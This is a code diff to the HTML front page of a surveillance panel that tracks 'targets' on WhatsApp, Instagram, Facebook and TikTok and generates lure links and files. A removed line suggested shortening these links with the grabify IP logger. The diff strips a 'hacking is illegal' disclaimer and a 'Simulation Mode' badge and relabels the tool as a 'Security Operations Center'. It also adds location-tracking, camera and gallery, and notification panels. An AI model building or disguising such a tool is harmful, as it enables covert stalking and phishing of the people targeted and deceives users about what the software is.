@@ -2,18 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Surveillance Dashboard</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="dashboard.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- PWA -->
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#0f172a">
+    <link rel="icon" type="image/png" sizes="192x192" href="icons/icon-192.png">
+    <link rel="apple-touch-icon" href="icons/icon-192.png">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="SOC Console">
 </head>
 <body>
-    <div class="warning-banner">
-        <i class="fas fa-exclamation-triangle"></i>
-        DISCLAIMER - HACKING IS ILLEGAL AND PURNISHABLE
-    </div>
-    
     <div class="dashboard-container">
         <!-- Sidebar -->
         <div class="sidebar">
@@ -83,78 +86,109 @@
                     <i class="fas fa-circle status-online"></i>
                     <span>System: <strong>Online</strong></span>
                 </div>
-                <div class="simulation-mode">
-                    <i class="fas fa-virus"></i>
-                    <span>Simulation Mode</span>
-                </div>
             </div>
         </div>
         
         <!-- Main Content -->
         <div class="main-content">
             <div class="content-header">
-                <h1><i class="fas fa-chart-bar"></i> Surveillance Dashboard</h1>
+                <div class="header-title">
+                    <h1><i class="fas fa-chart-bar"></i> Security Operations Center</h1>
+                    <p class="header-sub"><span class="pulse-dot"></span> Live monitoring console · build v2.4</p>
+                </div>
                 <div class="header-actions">
-                    <button class="btn-refresh">
-                        <i class="fas fa-sync-alt"></i> Refresh Data
-                    </button>
+                    <div class="threat-pill" id="threat-pill"><span class="dot"></span> Threat: <strong id="threat-level">LOW</strong></div>
+                    <button class="btn-refresh"><i class="fas fa-sync-alt"></i> Refresh</button>
                     <div class="current-time" id="current-time"></div>
                 </div>
             </div>
             
-            <!-- Stats Overview -->
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-icon" style="background: #25D366;">
-                        <i class="fab fa-whatsapp"></i>
-                    </div>
-                    <div class="stat-info">
-                        <h3>WhatsApp</h3>
-                        <p class="stat-value">3 Active Targets</p>
-                        <p class="stat-detail">47 messages today</p>
-                    </div>
+            <!-- System status strip -->
+            <div class="status-strip">
+                <div class="status-chip">
+                    <i class="fas fa-microchip"></i>
+                    <div class="sc-body"><span>CPU Load</span><b id="stat-cpu">23%</b></div>
+                    <div class="mini-bar"><i id="bar-cpu" style="width:23%"></i></div>
                 </div>
-                
-                <div class="stat-card">
-                    <div class="stat-icon" style="background: #E4405F;">
-                        <i class="fab fa-instagram"></i>
-                    </div>
-                    <div class="stat-info">
-                        <h3>Instagram</h3>
-                        <p class="stat-value">2 Active Targets</p>
-                        <p class="stat-detail">12 posts monitored</p>
-                    </div>
+                <div class="status-chip">
+                    <i class="fas fa-memory"></i>
+                    <div class="sc-body"><span>Memory</span><b id="stat-ram">41%</b></div>
+                    <div class="mini-bar"><i id="bar-ram" style="width:41%"></i></div>
                 </div>
-                
-                <div class="stat-card">
-                    <div class="stat-icon" style="background: #1877F2;">
-                        <i class="fab fa-facebook"></i>
-                    </div>
-                    <div class="stat-info">
-                        <h3>Facebook</h3>
-                        <p class="stat-value">4 Active Targets</p>
-                        <p class="stat-detail">23 activities today</p>
-                    </div>
+                <div class="status-chip">
+                    <i class="fas fa-network-wired"></i>
+                    <div class="sc-body"><span>Network</span><b id="stat-net">12.4 Mb/s</b></div>
+                    <div class="mini-bar"><i id="bar-net" style="width:60%"></i></div>
                 </div>
-                
-                <div class="stat-card">
-                    <div class="stat-icon" style="background: #000000;">
-                        <i class="fab fa-tiktok"></i>
-                    </div>
-                    <div class="stat-info">
-                        <h3>TikTok</h3>
-                        <p class="stat-value">Check Target</p>
-                        <p class="stat-detail"> Check videos watched</p>
-                    </div>
+                <div class="status-chip">
+                    <i class="fas fa-shield-alt"></i>
+                    <div class="sc-body"><span>Encryption</span><b>AES-256</b></div>
+                    <div class="mini-bar"><i style="width:100%"></i></div>
                 </div>
             </div>
-            
-            <!-- Recent Activity -->
-            <div class="activity-section">
-                <h2><i class="fas fa-history"></i> Recent Activity</h2>
-                <div class="activity-list" id="activity-list">
-                    <!-- Activity items will be loaded here -->
+
+            <!-- KPI cards (rendered by dashboard.js) -->
+            <div class="kpi-grid" id="kpi-grid"></div>
+
+            <!-- Traffic chart + signal radar -->
+            <div class="console-row">
+                <div class="panel chart-panel">
+                    <div class="panel-head">
+                        <h3><i class="fas fa-wave-square"></i> Network Traffic</h3>
+                        <span class="panel-tag live">LIVE</span>
+                    </div>
+                    <canvas id="traffic-chart"></canvas>
+                    <div class="chart-legend">
+                        <span><i style="background:#22d3ee"></i> Inbound</span>
+                        <span><i style="background:#9f7aea"></i> Outbound</span>
+                        <span class="chart-scale">last 60s</span>
+                    </div>
                 </div>
+                <div class="panel radar-panel">
+                    <div class="panel-head">
+                        <h3><i class="fas fa-satellite-dish"></i> Signal Intercept</h3>
+                        <span class="panel-tag">SCAN</span>
+                    </div>
+                    <div class="radar">
+                        <span class="radar-sweep"></span>
+                        <span class="ring r1"></span><span class="ring r2"></span><span class="ring r3"></span>
+                        <span class="blip" style="top:28%;left:62%"></span>
+                        <span class="blip" style="top:64%;left:34%"></span>
+                        <span class="blip" style="top:47%;left:75%"></span>
+                        <span class="blip" style="top:72%;left:58%"></span>
+                        <span class="radar-center"><i class="fas fa-satellite-dish"></i></span>
+                    </div>
+                    <div class="radar-caption">Scanning <b id="radar-count">6</b> active sessions · <span id="radar-loc">Distributed nodes</span></div>
+                </div>
+            </div>
+
+            <!-- Live feed + system log -->
+            <div class="console-row">
+                <div class="panel">
+                    <div class="panel-head">
+                        <h3><i class="fas fa-bolt"></i> Live Event Feed</h3>
+                        <span class="panel-tag live">STREAMING</span>
+                    </div>
+                    <div class="activity-list" id="activity-list">
+                        <!-- Activity items will be loaded here -->
+                    </div>
+                </div>
+                <div class="panel">
+                    <div class="panel-head">
+                        <h3><i class="fas fa-terminal"></i> System Log</h3>
+                        <span class="panel-tag">root@core</span>
+                    </div>
+                    <div class="terminal" id="terminal"></div>
+                </div>
+            </div>
+
+            <!-- Monitored targets -->
+            <div class="panel targets-panel">
+                <div class="panel-head">
+                    <h3><i class="fas fa-crosshairs"></i> Monitored Targets</h3>
+                    <span class="panel-tag" id="target-count">0 sessions</span>
+                </div>
+                <div class="targets-table" id="targets-table"></div>
             </div>
             
             <!-- Quick Actions -->
@@ -176,6 +210,26 @@
                     <button class="action-btn" onclick="window.location.href='tiktok.html'">
                         <i class="fab fa-tiktok"></i>
                         <span>TikTok Panel</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='location.html'">
+                        <i class="fas fa-map-marked-alt"></i>
+                        <span>Location Tracking</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='parental.html'">
+                        <i class="fas fa-child"></i>
+                        <span>Parental Controls</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='appusage.html'">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>App Usage</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='notifications.html'">
+                        <i class="fas fa-bell"></i>
+                        <span>Notifications</span>
+                    </button>
+                    <button class="action-btn" onclick="window.location.href='gallery.html'">
+                        <i class="fas fa-images"></i>
+                        <span>Camera &amp; Gallery</span>
                     </button>
                     <button class="action-btn" id="gen-link-btn">
                         <i class="fas fa-link"></i>
@@ -201,8 +255,8 @@
             </div>
             
             <div class="simulation-info">
-                <h4><i class="fas fa-info-circle"></i> Authentication Info</h4>
-                <p>you can send this file or link or also generate short link in grabify.</p>
+                <h4><i class="fas fa-info-circle"></i> Generated Items</h4>
+                <p>Links and files created in this session are listed below.</p>
                 <div class="simulation-stats">
                     <p>Links Generated: <span id="links-count">0</span></p>
                     <p>Files Generated: <span id="files-count">0</span></p>
@@ -291,5 +345,7 @@
     </div>
     
     <script src="dashboard.js"></script>
+    <script src="modules.js"></script>
+    <script src="pwa.js"></script>
 </body>
 </html>
